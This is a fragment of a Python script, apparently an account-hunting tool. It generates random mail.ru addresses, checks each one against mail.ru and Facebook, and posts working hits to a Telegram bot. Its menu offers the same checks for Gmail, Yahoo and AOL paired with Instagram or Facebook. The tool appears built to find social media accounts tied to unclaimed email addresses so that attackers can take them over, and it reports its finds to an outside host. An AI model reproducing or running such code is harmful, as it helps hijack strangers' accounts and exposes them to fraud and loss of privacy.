 	data = req.replace('[','').replace(']','').split(',')
 	for i in data:
 		eail = i.replace('"','')
 		u = str("".join(random.choice(r)for i in range(4)))
 		n0 = names.get_first_name(gender='male')
 		n1 = names.get_first_name()
 		n2 = names.get_first_name(gender='femal')
 		pa2 = n0 + u 
 		pa3 = n1 + u 
 		pa4 = n2 + u 
 		ema1 = eail.split("@")[0]
 		ema = Faker().email().split("@")[0]
 		em = (n0,n1,n2,ema,ema1,pa2,pa3,pa4)
 		emil = random.choice(em)
 		email = emil + "@mail.ru"
 		with open("mail_ru.txt",'a') as d:
 			d.write(email+"\n")
 		gmail = Azoz_check_email.mailru(email)
 		if gmail['email'] == True:
 			face = Azoz_check_email.facebook(email)
 			if face['status']=='Success':
 				ht += 1
 				requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+f"""
⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ғᴀcᴇ ʙʏ 𝕄ℝ𝕏 ⌯ 
• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
⌯ ᴇᴍᴀɪʟ » {email}
• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •
◔͜͡◔ ʙʏ » @vvvvvfvv - @GDO_0 .""")

 			else:
 				print(f'{X}• BaD Facbook » {email} ')
 		else:
 			print(f"{Z}▩ 𝙱𝙰𝙳 Mail.ru » {email} ")



def gdo():
	cls();azz()
	sr = input(f"{X} [{C}1{X}] {C}Check Gmail - Insta ⸙\n{X} [{C}2{X}] {C}Check Gmail - Face ⸙\n{X} [{C}3{X}] {C}Check Yahoo - Insta ⸙\n{X} [{C}4{X}] {C}Check Yahoo - Face ⸙\n{X} [{C}5{X}] {C}Check Mail - Insta ⸙\n{X} [{C}6{X}] {C}Check Mail - Face ⸙\n{X} [{C}7{X}] {C}Check Aol - Insta ⸙\n{X} [{C}8{X}] {C}Check Aol - Face ⸙\n{X} [{C}9{X}] {C}Devl{Z}Oper {C}⸙\n{X} --------------------- \n{X} [{C}⌯{X}] {C}ChooSe Number {X}» "+C)	
	print(f"{X}---------------------- ")
	if sr == "1":
		ginsta()
	elif sr == "2":
		gface()
	elif sr == "3":
		yinsta()
	elif sr == "4":
		yface()
	elif sr == "5":
		minsta()
	elif sr == "6":
		mface()
	elif sr == "7":
		ainsta()
	elif sr == "8":
		aface()
	elif sr == "9":
		cls();azz()
		print("\n• Devloper The Tool is 𝕄ℝ𝕏 .\n•Can You Send Msaage To Devloper .\n\n\n ")
		webbrowser.open("t.me/gdo00bot")
		exit()
	else:
		gdo()

while True:
	gdo()
	